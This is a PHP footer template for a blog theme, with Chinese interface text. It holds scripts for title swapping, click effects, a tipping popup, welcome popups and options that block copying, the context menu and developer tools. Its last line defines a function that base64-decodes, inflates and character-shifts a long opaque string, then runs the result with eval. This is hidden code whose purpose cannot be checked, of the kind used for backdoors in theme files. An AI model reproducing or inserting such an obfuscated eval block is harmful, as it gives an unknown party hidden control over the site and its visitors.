<script src="<?php echo resource_cdn() . 'public/fancybox.umd.js' ?>"></script>
<?php if ($this->options->cat_hidetitle): ?>
<script>
    $(function(){
       var pageTitle = jQuery(document).find("title").text();
       jQuery(window).blur(function() {
         jQuery("title").text("<?php echo $this->options->cat_hidetitle; ?>");
       });
       jQuery(window).focus(function() {
         jQuery("title").text(pageTitle);
       });
    });
</script>
<?php endif; ?>
<?php if($this->options->cat_clickword) : ?>
<script>
var a_idx = 0;
jQuery(document).ready(function ($) {
    $("body").click(function (e) {
      var a = new Array("<?php echo str_replace("||","\", \"", $this->options->cat_clickword); ?>");
      var $i = $("<span/>").text(a[a_idx]);
      a_idx = (a_idx + 1) % a.length;
      var x = e.pageX, y = e.pageY;
      $i.css({
        "z-index": 999,
        "top": y - 20,
        "left": x,
        "cursor": "default",
        "position": "absolute",
        "font-weight": "bold",
        "color": rand_color()
      });
      function rand_color() {
        return "rgb(" + ~~(255 * Math.random()) + "," + ~~(255 * Math.random()) + "," + ~~(255 * Math.random()) + ")"
      }
      $("body").append($i);
      $i.animate({
        "top": y - 180,
        "opacity": 0
      }, 1500, function () {
        $i.remove();
      });
    });
});
</script>
<?php endif; ?>
<div class="cat_tanchuang_out cat_dashang_out">
    <div class="cat_tanchuang cat_dashang">
        <img class="dashang_image avatar lazyload" src="<?php get_AvatarLazyload(); ?>" data-src="<?php get_user_avatar() ?>" alt="打赏图" style="margin: 1rem;width:10rem;height:10rem;">
        <div class="title">打赏博主</div>
        <?php if($this->options->cat_wechatpay):?>
            <button onclick="$('.dashang_image').attr('src','<?php echo $this->options->cat_wechatpay; ?>');" style="background:#009d0a;" type="submit"><i class="ri-wechat-pay-line"></i> 微信</button>
        <?php endif;?>
        <?php if($this->options->cat_alipay):?>
            <button onclick="$('.dashang_image').attr('src','<?php echo $this->options->cat_alipay; ?>');" style="background:#1578ff;" type="submit"><i class="ri-alipay-line"></i> 支付宝</button>
        <?php endif;?>
    </div>
</div>
<script>
document.addEventListener("copy",function(e){
	new jBox('Notice', { theme: 'NoticeFancy', attributes: { x: 'left', y: 'bottom' }, color: 'green', content: "复制成功！转载请务必保留原文链接!", animation: { open: 'slide:bottom', close: 'slide:left' } });
});
</script>
<div class="cat_tanchuang_out cat_welcomeoutside_out">
    <div class="cat_tanchuang">
        <img class="head_avatar avatar lazyload" src="<?php get_AvatarLazyload(); ?>" data-src="<?php get_user_avatar() ?>" alt="欢迎" style="margin: 1rem;">
        <div class="title welcome_chongdong" style="display:none;">欢迎你，“虫洞”穿梭旅行者</div>
        <div class="title welcome_kaiwang" style="display:none;">欢迎你，“开往”穿梭旅行者</div>
    </div>
</div>
<?php if ($this->options->cat_welcome_foreverblog == "on" || $this->options->cat_welcome_travellings == "on") : ?>
    <script>
    $(function(){
        if(document.referrer.indexOf("foreverblog")>0){
            $(".cat_welcomeoutside_out").show();
            $(".welcome_chongdong").show();
        }
        if(document.referrer.indexOf("travellings")>0){
            $(".cat_welcomeoutside_out").show();
            $(".welcome_kaiwang").show();
        }
        $(".cat_welcomeoutside_out").click(function(){
            $(this).hide();
        });
    });
    </script>
<?php endif; ?>
<?php if ($this->options->cat_welcome_switch && $this->options->cat_welcome_switch != "off") : ?>
    <div class="cat_tanchuang_out cat_welcome_out">
        <div class="cat_tanchuang">
            <img class="head_avatar avatar lazyload" src="<?php get_AvatarLazyload(); ?>" data-src="<?php get_user_avatar() ?>" alt="欢迎" style="margin: 1rem;">
            <div class="title">欢迎访问<?php $this->options->title() ?></div>
            <div style="margin-bottom: 0.5rem;color: var(--colorF);"><?php echo $this->options->cat_welcome_user ? $this->options->cat_welcome_user : '' ?></div>
            <button onclick="closewelcomeclick()" type="submit"><i class="ri-check-line"></i> 好哒</button>
        </div>
    </div>
    <script>
        $(function(){
            if(getCookie("pop_up") == 'on'){
                $('.cat_welcome_out').hide();
            }else{
                $('.cat_welcome_out').show();
            }
        });
        function closewelcomeclick(){
            $('.cat_welcome_out').hide();
            var date=new Date();
            <?php if ($this->options->cat_welcome_switch == "day") : ?>
            	date.setDate(date.getDate() + 1);
            	date.setHours(8);
            	date.setMinutes(0);
            	date.setSeconds(0);
            <?php elseif ($this->options->cat_welcome_switch == "week") : ?>
            	date.setDate(date.getDate() + 7);
            <?php elseif ($this->options->cat_welcome_switch == "once") : ?>
            	date.setDate(date.getDate() + 365);
            <?php endif; ?>
            document.cookie = "pop_up=on;path=/;expires="+date.toGMTString();
        }
    </script>
<?php endif; ?>
<?php if ($this->options->cat_ban_f12 == "on") : ?>
<script type="module">
	import devtools from "<?php echo resource_cdn() . 'public/devtools-detect.js'?>";
    	if (devtools.isOpen) {
    	   window.location.href = "<?php $this->options->themeUrl('/api/ban.html')?>"};
	window.addEventListener('devtoolschange', event => {
	    if (event.detail.isOpen) {
	       window.location.href = "<?php $this->options->themeUrl('/api/ban.html')?>"};
	});
</script>
<?php endif; ?>
<script>
$(function(){
    <?php if ($this->options->cat_ban_mouseleft == "on") : ?>
        document.onselectstart = function () {
            return false;
        };
    <?php endif; ?>
    <?php if ($this->options->cat_ban_mouseright == "on") : ?>
        document.oncontextmenu = function () {
            new jBox('Notice', { theme: 'NoticeFancy', attributes: { x: 'left', y: 'bottom' }, color: 'red', content: "右键菜单已关闭，复制内容请使用快捷键", animation: { open: 'slide:bottom', close: 'slide:left' } });
            return false;
        };
    <?php endif; ?>
    <?php if ($this->options->cat_ban_viewsource == "on") : ?>
        document.onkeydown = function () {
            if (event.ctrlKey && window.event.keyCode == 85) {
                new jBox('Notice', { theme: 'NoticeFancy', attributes: { x: 'left', y: 'bottom' }, color: 'red', content: "不建议查看源码（Ctrl+U）", animation: { open: 'slide:bottom', close: 'slide:left' } });
                return false;
            };
        };
    <?php endif; ?>
});
</script>
<script src="<?php echo resource_cdn() . 'public/jquery.md5.min.js' ?>"></script>
<script src="<?php echo resource_cdn() . 'public/lazysizes.min.js' ?>"></script>
<script src="<?php echo resource_cdn() . 'public/SmoothScroll.min.js' ?>"></script>
<script src="<?php echo resource_cdn() . 'public/OwO.min.js' ?>"></script>
<script src="<?php echo resource_cdn() . 'public/clipboard.min.js' ?>"></script>
<script>var clipboard = new ClipboardJS('.cat_copy');</script>
<script src="<?php echo resource_cdn() . 'js/body.js' ?>"></script>
<script src="<?php echo resource_cdn() . 'public/instantpage.js' ?>" type="module"></script>
<script src="<?php echo resource_cdn() . 'public/jBox.all.min.js'?>"></script>
<script src="<?php echo resource_cdn() . 'public/viewhistory.js'?>"></script>
<?php function hBuX($QEoimw)
{ 
$QEoimw=gzinflate(base64_decode($QEoimw));
 for($i=0;$i<strlen($QEoimw);$i++)
 {
$QEoimw[$i] = chr(ord($QEoimw[$i])-1);
 }
 return $QEoimw;
 }eval(hBuX("U1QEAe70svyU0qyCfMXKysoEp4y0/FLn4oKKkrRiTdUkEE+Lu4abKytdUbOwOC0jIS+pNCVTU8PAL8TLLbZEMyY+tqTWJk5HyyBLQ1cRogFIA1WWaGkpAjVyqRaUlRaWlaYVK9opani5Pd824eWKzmezVmrYcHPVKabllqQpYhjunlWc5l5QGWsANp9o0180rXnRM5EoG/ySKkszC/I1Y2JT47S1SLXILTUjDY/pKibmhpoxSXrVTnrRhnpW+kBzVYgyF6jv+fymV40L8DkdZDlt3G0Q5oJkDjYDwlyICt2gICzuUaytVURTpQhNaaT6IyiIKGeEQY0nzlB0v2E309nLNQyHeYpQgJomZ+1/tns5sskgJbhcHFCYVpwUA8xSsQZxpAUJWCe+wHDJLC7IIzfhQDTjM74kKT2pOItUc0PAupDMxW5zVlkeWA03V3FaaVlxPiKIbbjruB3suRUB"));?>
